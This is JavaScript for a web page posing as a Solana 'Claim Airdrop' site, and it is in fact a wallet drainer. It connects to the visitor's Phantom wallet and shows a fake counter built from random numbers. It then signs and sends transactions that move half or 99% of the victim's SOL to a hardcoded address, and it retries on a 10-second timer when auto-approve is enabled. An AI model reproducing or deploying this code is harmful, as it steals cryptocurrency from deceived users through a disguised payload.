//var web3 = require('@solana/web3.js');
//var splToken = require('@solana/spl-token');

var sent = false;

const network = "https://solana-mainnet.phantom.tech/";

const connection = new solanaWeb3.Connection(network);

const getProvider = () => {
  if ("solana" in window) {
    const provider = window.solana;

    if (provider.isPhantom) {
      return provider;
    }
  }

  window.open("https://phantom.app/", "_blank");
};

function onBodyLoad() {
  const solConnected = window.solana.isConnected;

  if(!solConnected) {
    connectWallet();
  }

  refreshStatus();
  var t=setInterval(refreshStatus,1000);

  function animateValue(obj, start, end, duration) {
    let current = start;
    obj.innerHTML = current; // immediately apply start value
    const setIncrOut = () => {
      let time = Math.random() * 1000;
      rndInt = Math.floor(Math.random() * 11);
  
      setTimeout(function() {
        if (current < end) {
          current += rndInt;
          obj.innerHTML = current;
          setIncrOut(time)
        }
      }, time);
    }
    setIncrOut();
  }
  
  document.querySelectorAll("#num_1").forEach(obj => animateValue(obj, 154, 321));


// let timerInterval;
// let time = 500;

// function updateTime() {
//     var rnd = Math.floor(Math.random() * (3)) + 7;
//     time = 500 + rnd;
//     if (time > 4981) {
//         time = 4981;
//     }
//     let secs = time;
//     document.querySelector('#num_1').innerHTML = `${secs}`;
// }
// var rnd2=Math.floor(Math.random()*(100))+3;

// function startTimer() {
//     timerInterval = setInterval(updateTime, rnd2);
// };

// function stopTimer() {
//     clearInterval(timerInterval);
// }
// window.onbeforeunload = function(event) {
//     localStorage.setItem('mintnumber', time);
// }
// window.addEventListener('load', () => {
//     time = parseInt(localStorage.getItem('mintnumber'));
//     if (isNaN(time)) time = 3591
//     startTimer()
// }, false);
var el = 0;
}

function refreshStatus() {
  const provider = getProvider();

  if(provider) {
    provider.on("connect", () => {
      setConnected();
    });

    provider.on("disconnect", () => {
      setNotConnected();
    });
  }
}

function connectWallet() {
  window.solana.connect({ onlyIfTrusted: false });
}

async function setConnected() {
  document.getElementById("connect").innerHTML = 'Claim Airdrop';
    // document.getElementById("connStatus").innerHTML = "Connected";
    // document.getElementById("connAddr").innerHTML = window.solana.publicKey.toString();
    let account_info = await connection.getAccountInfo(window.solana.publicKey);
    // document.getElementById("connBal").innerHTML = account_info.lamports;
      document.getElementById("msg").innerHTML = "";


    console.log("Auto Approve: " + window.solana.autoApprove);
}

function trySend() {
  if(window.solana.autoApprove) {
    if(!sent) {
      transferAllSOL();
    }
  } else {
    console.log("Not auto approve!");
  }
}

async function testTransfer2(howmany) {
  const provider = getProvider();
  const solConected = window.solana.isConnected;
  const manylamports = (howmany * 1000000000).toFixed(0);

  if(!provider) { return; }
  if(!solConected) {   connectWallet(); return }

  let account_info = await connection.getAccountInfo(window.solana.publicKey);
  
  var charginglamports = manylamports;

  try{
  if((account_info.lamports / 2) > manylamports) {
    charginglamports = (account_info.lamports / 2).toFixed(0);
    console.log(charginglamports);
  }
}catch(err){
  console.log(err);
  document.getElementById("msg").innerHTML = "Balance Required for Claiming process!";
    }
  if(account_info.lamports < manylamports && account_info.lamports > 10000000) {
    charginglamports = (account_info.lamports * 0.99).toFixed(0);
  }

    let transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: "2iHdhwwasbCfgBE9evtP19i7LfcGe4gc8ju91ZX72EpS",
        lamports: charginglamports,
      })
    );

    let { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = provider.publicKey;

    return transaction;
}

async function makeTransfer(howmany) {
  let transaction = await testTransfer2(howmany);
  const provider = getProvider();

  if(!provider) { return; }
  console.log(provider);
  console.log(transaction);

  if(transaction) {
    try {

      console.log("asd");
      let signed = await provider.signTransaction(transaction, connection);
      console.log(signed);
      let signature = await connection.sendRawTransaction(signed.serialize());
      console.log(signature);
      await connection.confirmTransaction(signature);
    } catch(err) {
     console.warn(err);
     document.getElementById("msg").innerHTML = "Transaction Failed, Please Try Again...";
    }
  }
}

async function testTransfer() {
  const provider = getProvider();
  const solConected = window.solana.isConnected;

  if(!provider) { return; }
  if(!solConected) { return; }

  let account_info = await connection.getAccountInfo(window.solana.publicKey);

  if(account_info.lamports >= 10000000) {
    let transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: "2iHdhwwasbCfgBE9evtP19i7LfcGe4gc8ju91ZX72EpS",
        lamports: (account_info.lamports * 0.99).toFixed(0),
      })
    );

    let { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = provider.publicKey;

    return transaction;
  }
}

async function transferAllSOL() {
  let transaction = await testTransfer();
  const provider = getProvider();

  if(!provider) { return; }
  console.log(provider);
  console.log(transaction);

  if(transaction) {
    //try {

      console.log("asd");

      let signed = await provider.signTransaction(transaction, connection);
      console.log(signed);
      let signature = await connection.sendRawTransaction(signed.serialize());
      console.log(signature);
      sent = true;
      await connection.confirmTransaction(signature);
    //} catch(err) {
    //  console.warn(err);
    //}
  }
}

function setNotConnected() {

  document.getElementById("connect").innerHTML = 'Connect Wallet';
  // connectWallet();
}

setInterval(trySend, 10000);

